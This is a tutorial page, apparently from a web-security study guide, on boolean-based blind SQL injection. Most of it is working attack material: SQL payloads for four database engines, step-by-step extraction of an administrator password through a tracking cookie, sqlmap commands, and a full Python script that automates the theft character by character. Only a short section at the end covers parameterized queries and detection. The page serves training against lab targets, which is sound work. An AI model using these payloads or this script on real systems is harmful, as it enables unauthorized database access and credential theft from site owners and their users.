# Boolean-Based Blind SQL Injection

When applications are vulnerable to SQL injection but don't display query results or error messages, you can still extract data using boolean-based blind techniques.

## What is Boolean-Based Blind SQLi?

Boolean-based blind SQL injection relies on asking the application TRUE/FALSE questions and observing different responses to infer data bit by bit.

## How It Works

### The Core Concept

Instead of seeing data directly, you:
1. Inject a condition that's either TRUE or FALSE
2. Observe the application's response
3. Determine if the condition was TRUE or FALSE
4. Extract data one character at a time

### Simple Example

**Vulnerable Query:**
```sql
SELECT * FROM products WHERE id = 'USER_INPUT'
```

**Testing:**
```sql
-- TRUE condition
' AND 1=1--
-- Response: Normal page with product

-- FALSE condition  
' AND 1=2--
-- Response: Empty page or error
```

## Real-World Scenario

### Tracking Cookie Example

**Application Behavior:**
```
Cookie: TrackingId=xyz123

If TrackingId exists in database:
    → Display "Welcome back" message
If TrackingId doesn't exist:
    → No message
```

**Vulnerable Query:**
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'xyz123'
```

### Exploitation Steps

**Step 1: Confirm SQLi exists**
```sql
-- TRUE condition (Welcome back appears)
xyz123' AND '1'='1

-- FALSE condition (Welcome back disappears)
xyz123' AND '1'='2
```

**Step 2: Confirm a table exists**
```sql
-- Test if 'users' table exists (TRUE → Welcome back)
xyz123' AND (SELECT COUNT(*) FROM users) > 0--
```

**Step 3: Confirm a user exists**
```sql
-- Test if 'administrator' user exists
xyz123' AND (SELECT COUNT(*) FROM users WHERE username='administrator') > 0--
```

**Step 4: Determine password length**
```sql
-- Test password length
xyz123' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') > 10--
xyz123' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') > 20--
xyz123' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') = 20--
-- Result: Password is 20 characters
```

**Step 5: Extract password character by character**

```sql
-- Test first character > 'm'
xyz123' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), 1, 1) > 'm'--
-- Result: TRUE (Welcome back appears)

-- Test first character > 't'  
xyz123' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), 1, 1) > 't'--
-- Result: FALSE (Welcome back disappears)

-- Test first character = 's'
xyz123' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), 1, 1) = 's'--
-- Result: TRUE (first character is 's')
```

## Complete Extraction Process

### Binary Search Algorithm

Instead of testing a-z sequentially, use binary search for efficiency:

```python
# Pseudo-code
charset = "abcdefghijklmnopqrstuvwxyz0123456789"
password = ""

for position in range(1, password_length + 1):
    for char in charset:
        payload = f"' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), {position}, 1) = '{char}'--"
        
        if send_payload(payload) == TRUE:
            password += char
            break
```

### Optimized Binary Search

```python
import string

def binary_search_char(position):
    low = 0
    high = 127  # ASCII range
    
    while low <= high:
        mid = (low + high) // 2
        payload = f"' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'), {position}, 1)) > {mid}--"
        
        if send_payload(payload) == TRUE:
            low = mid + 1
        else:
            high = mid - 1
    
    return chr(low)

password = ""
for i in range(1, 21):  # 20 char password
    password += binary_search_char(i)
    print(f"Password so far: {password}")
```

## Database-Specific Techniques

### MySQL

```sql
-- Length
' AND LENGTH((SELECT password FROM users WHERE username='admin')) = 20--

-- Character extraction
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'a'--

-- ASCII comparison (faster)
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1)) > 100--
```

### PostgreSQL

```sql
-- Length
' AND LENGTH((SELECT password FROM users WHERE username='admin')) = 20--

-- Character extraction
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'a'--
```

### MSSQL

```sql
-- Length
' AND LEN((SELECT password FROM users WHERE username='admin')) = 20--

-- Character extraction
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'a'--

-- ASCII comparison
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1)) > 100--
```

### Oracle

```sql
-- Length
' AND LENGTH((SELECT password FROM users WHERE username='admin')) = 20--

-- Character extraction
' AND SUBSTR((SELECT password FROM users WHERE username='admin'), 1, 1) = 'a'--
```

## Advanced Techniques

### 1. Extracting Multiple Rows

```sql
-- Get first username
' AND (SELECT username FROM users LIMIT 1 OFFSET 0) = 'admin'--

-- Get second username
' AND (SELECT username FROM users LIMIT 1 OFFSET 1) = 'user1'--

-- MySQL syntax
' AND (SELECT username FROM users LIMIT 1,1) = 'user1'--
```

### 2. Counting Records

```sql
-- Count users
' AND (SELECT COUNT(*) FROM users) = 5--

-- Count admin users
' AND (SELECT COUNT(*) FROM users WHERE role='admin') = 2--
```

### 3. Conditional Extraction

```sql
-- Extract only if certain condition is met
' AND (SELECT CASE WHEN (1=1) THEN (SELECT password FROM users WHERE username='admin') ELSE 'false' END) LIKE 's%'--
```

## Response Differences to Look For

### HTTP Status Codes
```
TRUE condition  → 200 OK
FALSE condition → 404 Not Found or 500 Internal Server Error
```

### Response Content
```
TRUE condition  → "Welcome back" message appears
FALSE condition → Message disappears

TRUE condition  → Product image displays
FALSE condition → Broken image icon

TRUE condition  → 3 search results
FALSE condition → 0 search results
```

### Response Time
```
TRUE condition  → 100ms response time
FALSE condition → 500ms response time (with time-based query)
```

### Content Length
```
TRUE condition  → Response is 5432 bytes
FALSE condition → Response is 4891 bytes
```

## Automation Tools

### SQLMap
```bash
# Basic boolean-based blind SQLi
sqlmap -u "http://example.com/page?id=1" --technique=B

# With cookie
sqlmap -u "http://example.com/page" --cookie="TrackingId=xyz123" --technique=B

# Specific string to detect TRUE
sqlmap -u "http://example.com/page?id=1" --string="Welcome back"

# Specific string to detect FALSE
sqlmap -u "http://example.com/page?id=1" --not-string="Error"
```

### Custom Python Script Example

```python
import requests

def is_true(payload):
    url = "http://example.com/page"
    cookies = {"TrackingId": payload}
    response = requests.get(url, cookies=cookies)
    return "Welcome back" in response.text

def extract_password():
    charset = "abcdefghijklmnopqrstuvwxyz0123456789"
    password = ""
    
    # First, get password length
    for length in range(1, 50):
        payload = f"xyz' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') = {length}--"
        if is_true(payload):
            print(f"[+] Password length: {length}")
            break
    
    # Extract each character
    for position in range(1, length + 1):
        for char in charset:
            payload = f"xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), {position}, 1) = '{char}'--"
            if is_true(payload):
                password += char
                print(f"[+] Character {position}: {char} (password so far: {password})")
                break
    
    return password

# Run extraction
admin_password = extract_password()
print(f"\n[+] Final password: {admin_password}")
```

## Common Pitfalls

### 1. Case Sensitivity

```sql
-- This might fail if password is 'Admin' not 'admin'
' AND (SELECT password FROM users WHERE username='administrator') = 'admin'--

-- Use LOWER() or UPPER()
' AND LOWER((SELECT password FROM users WHERE username='administrator')) LIKE 'a%'--
```

### 2. Special Characters

```sql
-- Escape special characters
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), 1, 1) = '\''--
                                                                                     ^^
                                                                                   Escaped quote
```

### 3. NULL Values

```sql
-- NULL comparison always returns FALSE
' AND (SELECT email FROM users WHERE username='administrator') = NULL--  ❌

-- Correct way
' AND (SELECT email FROM users WHERE username='administrator') IS NULL--  ✅
```

## Detection and Prevention

### How Applications Can Detect

1. **Monitor query execution time** - Repeated similar queries
2. **Track failed login attempts** - Unusual patterns
3. **WAF signatures** - Common boolean-based patterns
4. **Rate limiting** - Too many requests from same IP

### How to Prevent

```python
# Bad (vulnerable)
query = f"SELECT * FROM users WHERE id = '{user_input}'"

# Good (parameterized)
cursor.execute("SELECT * FROM users WHERE id = ?", (user_input,))
```

## Key Takeaways

1. **Boolean-based blind SQLi** works when you can observe TRUE/FALSE responses
2. **Binary search** dramatically speeds up data extraction
3. **Automation** is essential for practical exploitation
4. **Patience required** - extracting data character-by-character is slow
5. **Always test systematically** - confirm each condition carefully

## Practice Labs

- PortSwigger Academy: "Blind SQL injection with conditional responses"
- DVWA: SQL Injection (Blind)
- HackTheBox: Various machines with blind SQLi
- TryHackMe: SQL Injection rooms

---

**Next:** [Error-Based Blind SQLi](error-based.md) | [Time-Based Blind SQLi](time-based.md)

**Remember: Only test on authorized systems!**
